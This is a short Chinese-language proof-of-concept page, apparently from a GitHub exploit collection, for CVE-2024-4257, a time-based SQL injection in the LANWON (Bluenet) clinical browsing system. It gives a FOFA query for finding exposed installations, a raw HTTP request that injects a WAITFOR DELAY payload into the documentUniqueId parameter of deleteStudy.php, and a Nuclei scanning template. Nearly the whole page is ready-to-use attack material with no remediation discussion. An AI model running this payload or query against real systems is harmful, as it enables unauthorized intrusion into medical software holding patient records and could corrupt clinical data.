## 蓝网科技临床浏览系统-deleteStudy-SQL注入漏洞复现(CVE-2024-4257)

## fofa
```
app="LANWON-临床浏览系统"
```


## poc
```
GET /xds/deleteStudy.php?documentUniqueId=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![3381645ae427d513ecd41049698ca5e6](https://github.com/wy876/POC/assets/139549762/87fa4b24-5d9b-4007-9f97-e1a266dd3d49)

## Nuclei 
```
id: Bluenet_Technology_Clinical_Browsing_documentUniqueId_SQL_injection

info:
  name: Bluenet_Technology_Clinical_Browsing_documentUniqueId_SQL_injection
  author: xiaoming
  severity: high
  description: Bluenet Technology Clinical Browsing System documentUniqueId SQL injection(CVE-2024-4257)
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /xds/deleteStudy.php?documentUniqueId=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
    Host: {{Hostname}}
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    sec-ch-ua-platform: "Windows"
    sec-ch-ua: "Google Chrome";v="109", "Chromium";v="109", "Not=A?Brand";v="24"
    sec-ch-ua-mobile: ?0
    Connection: close

  redirects: true
  matchers-condition: and
  matchers:
  - id: 1
    type: dsl
    dsl:
    - 'duration>=5'
```
